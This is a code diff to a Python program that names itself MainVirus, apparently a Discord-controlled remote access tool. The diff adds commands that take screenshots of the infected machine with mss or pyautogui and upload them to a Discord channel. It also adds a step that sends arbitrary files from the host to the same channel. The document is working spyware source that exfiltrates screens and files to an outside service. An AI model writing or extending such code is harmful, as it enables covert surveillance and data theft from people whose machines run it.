@@ -5,6 +5,8 @@ from pathlib import Path
 from PIL import ImageGrab
 import base64
 import time
+from mss import mss
+import pyautogui
 
 
 class MainVirus:  # Making a class to wrap code cause organisation
@@ -18,6 +20,9 @@ class MainVirus:  # Making a class to wrap code cause organisation
             "cdir": self.cd,
             "dog": self.cat,
             "screen": self.screen,
+            "screen2": self.screen2,
+            "uuid": self.uuid,
+            "screen3": self.screen3,
         }
 
     def run(self):  # runs the program
@@ -79,6 +84,40 @@ class MainVirus:  # Making a class to wrap code cause organisation
             if self.isCommandConfirm(event, "dog"):  # Checks for confirmation
                 await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
                 fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
+                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
+
+    def screen2(self, syntax):
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def onConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
+                try:
+                    os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                except:
+                    pass
+                now = datetime.datetime.now()  # Gets the current time
+                fileLoc = os.path.join(os.getcwd(), "screenshot",
+                                       f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
+                await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
+                with mss() as sct:
+                    filename = sct.shot(output=fileLoc)  # Takes a screenshot
+                await self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
+                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
+
+    def screen3(self, syntax):
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def onConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
+                try:
+                    os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                except:
+                    pass
+                now = datetime.datetime.now()  # Gets the current time
+                fileLoc = os.path.join(os.getcwd(), "screenshot",
+                                       f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
+                await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
+                screenshot = pyautogui.screenshot()  # Takes a screenshot
+                screenshot.save(fileLoc)  # Saves screenshot
+                await self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
                 await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
 
     def uuid(self, syntax):  # UUID command - Returns the player's uuid
